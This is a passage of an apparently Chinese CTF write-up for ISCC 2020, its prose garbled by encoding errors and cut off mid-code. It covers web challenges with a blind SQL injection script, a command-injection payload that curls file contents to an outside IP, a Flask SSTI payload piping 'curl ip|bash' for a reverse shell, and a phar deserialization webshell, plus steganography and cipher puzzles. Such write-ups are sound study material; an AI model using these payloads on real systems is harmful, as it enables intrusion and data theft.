python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">s=string.digits+string.ascii_lowercase</span><br><span class="line">url=<span class="string">&#x27;http://101.201.126.95:7006/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">f=flag</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&#x27; union select 1,1433223,&#x27;&#123;&#125;&#x27; order by 3#&quot;</span>.format(flag+i),</span><br><span class="line"><span class="string">&quot;password&quot;</span>:<span class="string">&quot;aaa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">flag=flag+s[s.index(i)<span class="number">-1</span>]</span><br><span class="line">print(s[s.index(i)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> flag==f:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># bfe42ac26e273ef3a859a651e0a02df0</span></span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºå•¥æœ€åä¸€ä¸ª<code>0</code>è·‘äº†å¥½å‡ æ¬¡æ‰å‡ºæ¥ï¼Œä¸€ç›´å‡‘ä¸å¤Ÿ32ä½,è§£MD5å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;iloveishuai&#125;</span><br></pre></td></tr></table></figure><h4 id="é˜¿å¸…çš„çˆ±æƒ…"><a href="#é˜¿å¸…çš„çˆ±æƒ…" class="headerlink" title="é˜¿å¸…çš„çˆ±æƒ…"></a>é˜¿å¸…çš„çˆ±æƒ…</h4><p>è®¿é—®å¾—åˆ°æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&quot;ip&quot;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $ip=$_GET[<span class="string">&quot;ip&quot;</span>];</span><br><span class="line">    $pattern=<span class="string">&quot;/[;|&amp;].*[a-zA-Z]+/&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($pattern,$ip)!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;bad domain&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $result = shell_exec(<span class="string">&#x27;ping -c 4 &#x27;</span> . $ip);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">        $result = $e-&gt;getMessage();</span><br><span class="line">        <span class="keyword">echo</span> $result;</span><br><span class="line">    &#125;</span><br><span class="line">    $result = str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br&gt;&quot;</span>, $result);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ„é€ payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=`curl 47.97.210.141:9000/?$(tail -n 2 flag.php)`</span><br></pre></td></tr></table></figure><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ISCCç­¾åˆ°"><a href="#ISCCç­¾åˆ°" class="headerlink" title="ISCCç­¾åˆ°"></a>ISCCç­¾åˆ°</h4><p>ç›´æ¥æ”¹ä¸‹é«˜åº¦å°±èƒ½çœ‹åˆ°</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200506231349.png" style="zoom: 80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;D3tivtm_zv_Tq5I_Dygef&#125;</span><br></pre></td></tr></table></figure><p>æäº¤å‘ç°ä¸å¯¹ï¼ŒçŒœæµ‹æ˜¯æŸç§ç¼–ç ï¼Œæœ€ç»ˆå‘ç°æ˜¯å‡¯æ’’å¯†ç å˜ç§,çœ‹ä¸‹è¿™ä¸ªè„šæœ¬å§ï¼Œå»æ‰æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œå‘ç°æœ‰è§„å¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s1=<span class="string">&#x27;D3tivtm_zv_Tq5I_Dygef&#x27;</span></span><br><span class="line">s2=<span class="string">&#x27;W3lcome_to_Mi5C_Wryyy&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> zip(s1,s2):</span><br><span class="line"><span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;0123456789_&quot;</span>:</span><br><span class="line"><span class="keyword">if</span> ord(i)-ord(j)&lt;<span class="number">0</span>:</span><br><span class="line">print(i+<span class="string">&#x27; &#x27;</span>+j+<span class="string">&#x27; &#x27;</span>+str(<span class="number">26</span>-ord(j)+ord(i)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(i+<span class="string">&#x27; &#x27;</span>+j+<span class="string">&#x27; &#x27;</span>+str(ord(i)-ord(j)))</span><br><span class="line"><span class="comment"># 7867å¾ªç¯</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆflagï¼Œå‰é¢çš„å¾ˆåƒ<code>welcome to</code>ï¼Œå®åœ¨ä¸è¡ŒçŒœä¹Ÿè¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISCC&#123;W3lcome_to_Mi5C_Wryyy&#125;</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾å°æ˜-1"><a href="#å¯»æ‰¾å°æ˜-1" class="headerlink" title="å¯»æ‰¾å°æ˜-1"></a>å¯»æ‰¾å°æ˜-1</h4><p>æ ¹æ®<code>æœ€ä½ä½çš„èƒŒå½±.png</code>ç«‹é©¬æƒ³åˆ°äº†lsbéšå†™ç›¸å…³çš„ï¼ŒStegSloveæ‰“å¼€ï¼Œåˆ‡æ¢ä¸åŒé€šé“ï¼Œå‘ç°ä¸€å¼ äºŒç»´ç </p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507103110.png" style="zoom:80%;"><p>æ‰«å‡ºæ¥ä¸€ä¸ªé“¾æ¥ï¼Œæ‰“å¼€å‘ç°æ˜¯</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507103220.png" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">257</span>,<span class="number">1</span>,<span class="number">258</span>,<span class="number">2</span>,<span class="number">259</span>,<span class="number">3</span>,<span class="number">260</span>,<span class="number">4</span>,<span class="number">261</span>,<span class="number">5</span>,<span class="number">262</span>,<span class="number">7</span>,<span class="number">263</span>,<span class="number">8</span>,<span class="number">259</span>,<span class="number">277</span>,<span class="number">438</span>,<span class="number">300</span>,<span class="number">455</span>,<span class="number">319</span>,<span class="number">25</span>,<span class="number">300</span>,<span class="number">456</span>,<span class="number">400</span>,<span class="number">66</span>,<span class="number">366</span>,<span class="number">78</span>,<span class="number">300</span>,<span class="number">421</span>,<span class="number">259</span>,<span class="number">452</span>,<span class="number">23</span>]</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å•¥å‘¢ï¼Ÿ</p><p>æœ€ç»ˆflag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ISCC*funny&#125;</span><br></pre></td></tr></table></figure><h4 id="ISCCæˆç»©æŸ¥è¯¢-1"><a href="#ISCCæˆç»©æŸ¥è¯¢-1" class="headerlink" title="ISCCæˆç»©æŸ¥è¯¢-1"></a>ISCCæˆç»©æŸ¥è¯¢-1</h4><p>StegSloveæ‰“å¼€ï¼Œå‘ç°è—ç€</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507123235.png" style="zoom:80%;"><p>æ²¿ç€è·¯å¾„èµ°å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TRLNCHHAFCIEEIEEPR</span><br></pre></td></tr></table></figure><p>æ …æ å¯†ç è§£å¯†å¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;THERAILFENCECIPHER&#125;</span><br></pre></td></tr></table></figure><h4 id="ç¥ç§˜ç»„ç»‡çš„é‚®ä»¶-1"><a href="#ç¥ç§˜ç»„ç»‡çš„é‚®ä»¶-1" class="headerlink" title="ç¥ç§˜ç»„ç»‡çš„é‚®ä»¶-1"></a>ç¥ç§˜ç»„ç»‡çš„é‚®ä»¶-1</h4><p>StegSloveæ‰“å¼€ï¼Œå‘ç°æœ‰</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">é›„æœºå¯Œé­</span><br><span class="line">é›„ç½¡å­¤æ· å‹‡ç«‹é›„è‹±</span><br><span class="line">è´µçŒ›çŒ›å‹‡</span><br></pre></td></tr></table></figure><p>å‘ç°æ¯ä¸ªæ±‰å­—å¯¹åº”36å¤©ç½¡72åœ°ç…ï¼Œè¯•äº†è¯•å‘ç°éƒ½æ˜¯å¤©ç½¡,æ¢æˆå¯¹åº”çš„é¡ºåº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é›„æœºå¯Œé­    å¤©ï¼š6 3 11 1</span><br><span class="line"></span><br><span class="line">é›„ç½¡å­¤æ·å¤©ï¼š6 2 13 16</span><br><span class="line"></span><br><span class="line">å‹‡ç«‹é›„è‹±å¤©ï¼š5 15 6 9</span><br><span class="line"></span><br><span class="line">è´µçŒ›çŒ›å‹‡å¤©ï¼š10 7 7 5</span><br></pre></td></tr></table></figure><p>å‘ç°æœ€å¤§æ•°16ï¼Œæœ€å°æ•°ä¸º1ï¼Œæƒ³åˆ°16è¿›åˆ¶ï¼Œæ‰€æœ‰æ•°å‡1ï¼Œè½¬æ¢æˆ16è¿›åˆ¶ï¼Œè½¬æ¢æˆUTF-16</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">é›„æœºå¯Œé­    å¤©ï¼š6 3 11 152a0</span><br><span class="line"></span><br><span class="line">é›„ç½¡å­¤æ·å¤©ï¼š6 2 13 1651cf</span><br><span class="line"></span><br><span class="line">å‹‡ç«‹é›„è‹±å¤©ï¼š5 15 6 94e58</span><br><span class="line"></span><br><span class="line">è´µçŒ›çŒ›å‹‡å¤©ï¼š10 7 7 59664</span><br><span class="line"></span><br><span class="line">\u52a0\u51cf\u4e58\u9664</span><br></pre></td></tr></table></figure><p>UTF-16è½¬æ¢åœ°å€ï¼š<a href="http://www.msxindl.com/tools/unicode16.asp">http://www.msxindl.com/tools/unicode16.asp</a></p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507144230.png" style="zoom: 80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;åŠ å‡ä¹˜é™¤&#125;</span><br></pre></td></tr></table></figure><h4 id="è€³å¬ä¸ºå®"><a href="#è€³å¬ä¸ºå®" class="headerlink" title="è€³å¬ä¸ºå®"></a>è€³å¬ä¸ºå®</h4><p>æŸ¥çœ‹å±æ€§å‘ç°å‰¯æ ‡é¢˜æ˜¯flag,çŒœæµ‹MP3Stegoéšå†™ï¼Œå¯†ç è¯•è¯•flagï¼Œå¾—åˆ°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag is hereï¼</span><br><span class="line">https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1L3cq1CRVhvv6mq8qogq-sA</span><br><span class="line">dHc0aQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>base64è§£å¯†å¾—åˆ°æå–ç ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå‘ç°æ¯”åŸæ¥çš„å¤§ï¼Œbinwalkåˆ†ç¦»å‡ºå‹ç¼©åŒ…ï¼Œè§£å‹å¾—åˆ°</p><p><code>flag-RD.wav</code>å’Œ<code>ctf-produce.py</code></p><p><strong>ctf-produce.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> wave</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–éŸ³é¢‘ä¿¡å·</span></span><br><span class="line">f = wave.open(os.path.abspath(<span class="string">&#x27;./flag.wav&#x27;</span>), <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># äºŒè¿›åˆ¶åªè¯»æ¨¡å¼ï¼Œæ‰“å¼€éŸ³é¢‘æ–‡ä»¶</span></span><br><span class="line">params = f.getparams() <span class="comment"># è¿”å›éŸ³é¢‘å‚æ•°ï¼Œå…ƒç»„ï¼šå£°é“æ•°ï¼Œé‡åŒ–ä½æ•°(byteå•ä½)ï¼Œé‡‡æ ·é¢‘ç‡ï¼Œé‡‡æ ·ç‚¹æ•°ï¼Œå‹ç¼©ç±»å‹ï¼Œå‹ç¼©ç±»å‹çš„æè¿°</span></span><br><span class="line">nchannels, sampwidth, framerate, nframes=params[:<span class="number">4</span>] <span class="comment"># èµ‹å€¼å£°é“æ•°ï¼Œé‡åŒ–ä½æ•°ï¼Œé‡‡æ ·é¢‘ç‡ï¼Œé‡‡æ ·ç‚¹æ•°</span></span><br><span class="line">str = f.readframes(nframes) <span class="comment"># è¯»å–é‡‡æ ·ç‚¹æ•°æ®ï¼Œå­—ç¬¦ä¸²ç±»å‹</span></span><br><span class="line">wave_data = np.fromstring(str, dtype=np.short) <span class="comment"># å­—ç¬¦ä¸²è½¬æ¢ä¸ºshortç±»å‹</span></span><br><span class="line">time = np.arange(<span class="number">0</span>, nframes) * (<span class="number">1.0</span> / framerate) <span class="comment"># é€šè¿‡é‡‡æ ·ç‚¹æ•°å’Œå–æ ·é¢‘ç‡è®¡ç®—å‡ºæ¯ä¸ªå–æ ·çš„æ—¶é—´</span></span><br><span class="line"><span class="comment"># è¯­éŸ³ä¿¡å·åˆ†å¸§å¤„ç†</span></span><br><span class="line">wlen = <span class="number">100</span> <span class="comment"># å¸§é•¿</span></span><br><span class="line">inc = <span class="number">50</span> <span class="comment"># å¸§ç§»</span></span><br><span class="line">signal_length = len(wave_data) <span class="comment"># ä¿¡å·æ€»é•¿åº¦</span></span><br><span class="line"><span class="keyword">if</span> signal_length &lt;= wlen: <span class="comment"># è‹¥ä¿¡å·é•¿åº¦å°äºä¸€ä¸ªå¸§çš„é•¿åº¦ï¼Œåˆ™å¸§æ•° nf å®šä¹‰ä¸º1ï¼Œå¦åˆ™ï¼Œè®¡ç®—å¸§çš„æ€»é•¿åº¦</span></span><br><span class="line">    nf = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    nf = int(np.ceil((<span class="number">1.0</span>*signal_length-wlen+inc)/inc))</span><br><span class="line">pad_length = int((nf<span class="number">-1</span>)*inc+wlen) <span class="comment"># æ‰€æœ‰å¸§åŠ èµ·æ¥æ€»çš„é“ºå¹³åçš„é•¿åº¦</span></span><br><span class="line">zeros = np.zeros((pad_length-signal_length), dtype=int) <span class="comment"># ä¸å¤Ÿçš„é•¿åº¦ä½¿ç”¨0å¡«è¡¥</span></span><br><span class="line">pad_signal = np.concatenate((wave_data,zeros)) <span class="comment"># å¡«è¡¥åçš„ä¿¡å·è®°ä¸ºpad_signal</span></span><br><span class="line">indices = np.tile(np.arange(<span class="number">0</span>,wlen),(nf,<span class="number">1</span>))+np.tile(np.arange(<span class="number">0</span>,nf*inc,inc), (wlen,<span class="number">1</span>)).T  <span class="comment"># ç›¸å½“äºå¯¹æ‰€æœ‰å¸§çš„æ—¶é—´ç‚¹è¿›è¡ŒæŠ½å–ï¼Œå¾—åˆ°nf*wlené•¿åº¦çš„çŸ©é˜µ</span></span><br><span class="line">indices = np.array(indices, dtype=np.int32) <span class="comment"># å°†indicesè½¬åŒ–ä¸ºçŸ©é˜µ</span></span><br><span class="line">indices = np.random.permutation(indices)</span><br><span class="line">frames = pad_signal[indices] <span class="comment"># å¾—åˆ°å¸§ä¿¡å·</span></span><br><span class="line">frames = frames.flatten()</span><br><span class="line">w = wave.open(os.path.abspath(<span class="string">&#x27;./flag-RD.wav&#x27;</span>), <span class="string">&quot;wb&quot;</span>) <span class="comment"># æ‰“å¼€WAVæ–‡æ¡£</span></span><br><span class="line"><span class="comment"># é…ç½®å£°é“æ•°ã€é‡åŒ–ä½æ•°å’Œå–æ ·é¢‘ç‡</span></span><br><span class="line">w.setnchannels(nchannels)</span><br><span class="line">w.setsampwidth(sampwidth)</span><br><span class="line">w.setframerate(framerate*<span class="number">2</span>) <span class="comment"># é‡‡æ ·é¢‘ç‡è‡³å°‘æ˜¯ä¿¡å·é¢‘ç‡æœ€é«˜é¢‘ç‡çš„ä¸¤å€ä»¥ä¸Šæ‰èƒ½é‡æ–°æ¢å¤ä¸ºåŸæ¥çš„æ¨¡æ‹Ÿä¿¡å·</span></span><br><span class="line">w.writeframes(frames.tostring()) <span class="comment"># å°†wav_dataè½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line">w.close()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œéœ€è¦æˆ‘ä»¬é€†æ¨flag.waväº†</p><h4 id="åƒå±‚å¥—è·¯"><a href="#åƒå±‚å¥—è·¯" class="headerlink" title="åƒå±‚å¥—è·¯"></a>åƒå±‚å¥—è·¯</h4><p>ä¸€å¼ gifå›¾ç‰‡ï¼Œstegsloveåˆ†ç¦»å‡º8å¼ å›¾ç‰‡ï¼Œpsæ‹¼ä¸€ä¸‹</p><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200516122622.png" style="zoom:67%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sr5#TKh~ck3^</span><br></pre></td></tr></table></figure><p>æäº¤flagå‘ç°ä¸å¯¹</p><h2 id="æ“‚å°é¢˜"><a href="#æ“‚å°é¢˜" class="headerlink" title="æ“‚å°é¢˜"></a>æ“‚å°é¢˜</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="Easy-Injection"><a href="#Easy-Injection" class="headerlink" title="Easy Injection"></a>Easy Injection</h4><p>flask sstiï¼Œç›´æ¥Pç¥çš„payloadåå¼¹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl ip|bash&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/05/06/ISCC2020-writeup/TIMæˆªå›¾20200507151744.png" style="zoom:80%;"><p>rootæƒé™å°±å¾ˆå¥‡æ€ª</p><h4 id="å¤§é»‘é˜”"><a href="#å¤§é»‘é˜”" class="headerlink" title="å¤§é»‘é˜”"></a>å¤§é»‘é˜”</h4><p>æ‰«ç›®å½•ï¼Œå‘ç°æœ‰æºç <a href="http://www.zip/">www.zip</a></p><p>upload.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$tmp_file_location=<span class="string">&#x27;/var/www/html/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>]==<span class="string">&quot;image/gif&quot;</span>)&amp;&amp;(substr($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>))== <span class="string">&#x27;gif&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Upload: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Type: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Temp file: &quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($tmp_file_location.<span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      $tmp_file_location.<span class="string">&quot;upload_file/&quot;</span> .$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .$tmp_file_location. <span class="string">&quot;upload_file/&quot;</span> . $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Invalid file,you can only upload gif&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;echo &quot;ok&quot;;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename);</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾pharååºåˆ—åŒ–ï¼Œç”±äºç‰ˆæœ¬æ˜¯php5.6ï¼Œå¯ä»¥ç”¨assertï¼Œæ‰€ä»¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">&#x27;assert($_POST[1]);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸º phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$object = <span class="keyword">new</span> AnyClass;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//å°†è‡ªå®šä¹‰çš„ meta-data å­˜å…¥ manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>); <span 